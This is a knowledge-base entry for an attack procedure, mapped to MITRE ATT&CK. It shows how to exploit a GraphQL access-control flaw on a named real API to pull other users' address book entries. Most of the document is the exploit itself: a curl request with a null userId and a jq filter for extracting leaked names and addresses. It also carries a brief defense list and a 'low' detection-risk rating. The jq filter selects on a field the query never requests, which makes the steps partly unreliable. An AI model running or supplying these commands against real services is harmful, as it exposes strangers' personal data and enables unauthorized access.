---
id: proc-uuid-2
name: Analyze-Backend-API-Response-for-Data-Disclosure
tags:
  - data-disclosure
  - api-response
  - analysis
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/send-graphql-query-curl]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:48.507Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Analyze-Backend-API-Response-for-Data-Disclosure

## Summary

This procedure involves capturing and parsing the backend API response from a malformed GraphQL query to extract and verify disclosed address book entries from unauthorized accounts, confirming the access control vulnerability.

## Description

Following the modified GraphQL query, the backend API returns data without proper isolation, including addresses from 'undefined' username accounts. Analysis reveals the extent of disclosure, which is limited but includes sensitive personal information like names and addresses. This step uses response inspection tools to validate the exploit in a web-based GraphQL environment.

## Requirements

1. Captured API response from previous query step
2. JSON parsing tool (e.g., jq or browser console)
3. Authenticated session context

## Defense

Defensive measures and detection strategies:

- Sanitize and filter API responses to exclude data from mismatched user contexts
- Implement rate limiting on GraphQL queries to detect anomalous patterns
- Use data loss prevention (DLP) tools to scan responses for PII leakage

## Objectives

1. Extract leaked address book entries
2. Verify data belongs to non-owned accounts
3. Document the scope of disclosure for reporting

## Instructions

### Step 1: Capture the Response

**Context**: Send the modified query and save the full response for analysis.

**Command** ([[commands/send-graphql-query-curl]]):
```bash
curl -X POST https://api.starbucks.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query": "query GetAddressBook($userId: ID!) { addressBook(userId: $userId) { entries { name address } } }", "variables": {"userId": null}}' -o response.json
```

> Saves the JSON response to a file. Expected output: File containing address data.

### Step 2: Parse and Inspect for Leaked Data

**Context**: Use jq or similar to filter and examine the entries, checking for 'undefined' indicators.

**Command** ([[commands/send-graphql-query-curl]]):
```bash
cat response.json | jq '.data.addressBook.entries[] | select(.user == "undefined") | {name, address}'
```

> Extracts entries from 'undefined' accounts. Expected output: List of foreign addresses confirming disclosure.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/send-graphql-query-curl]]

## Tools Used


## Tags

- [[data-disclosure]]
- [[api-response]]
- [[analysis]]
